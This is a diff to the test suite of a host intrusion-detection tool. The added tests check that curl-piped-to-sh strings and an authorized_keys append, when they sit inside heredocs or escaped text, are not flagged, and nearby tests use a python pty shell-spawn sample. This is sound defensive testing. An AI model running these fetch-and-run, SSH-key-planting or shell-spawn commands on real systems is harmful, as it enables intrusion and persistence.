@@ -172,6 +172,15 @@ def test_newline_delimited_download_pipeline_is_detected():
     assert len(run(host.DownloadPipedToShell, [exec_ev(argv)])) == 1
 
 
+@pytest.mark.parametrize("script", [
+    "cat > /tmp/README <<EOF\ncurl http://e/install | sh\nEOF",
+    r"echo usage: \; curl http://e/i \| sh",
+    "apt-get update # then; curl http://e | sh",
+])
+def test_shell_data_is_not_a_download_pipeline(script):
+    assert run(host.DownloadPipedToShell, [exec_ev(["bash", "-c", script])]) == []
+
+
 # ---------------------------------------------------------------- python pty spawn
 def test_pty_spawn_found():
     m = run(host.PtyUpgrade, [exec_ev(["python3", "-c", 'import pty;pty.spawn("/bin/bash")'])])
@@ -265,6 +274,12 @@ def test_authorized_keys_negatives(argv):
 def test_quoted_redirect_is_not_an_authorized_keys_write():
     argv = ["/bin/sh", "-c", 'grep -c ">" /root/.ssh/authorized_keys']
     assert run(host.AuthorizedKeysWrite, [exec_ev(argv)]) == []
+
+
+def test_heredoc_body_is_not_an_authorized_keys_write_command():
+    script = "cat > /tmp/README <<EOF\necho key >> /root/.ssh/authorized_keys\nEOF"
+
+    assert run(host.AuthorizedKeysWrite, [exec_ev(["bash", "-c", script])]) == []
 
 
 # ---------------------------------------------------------------- ssh login external
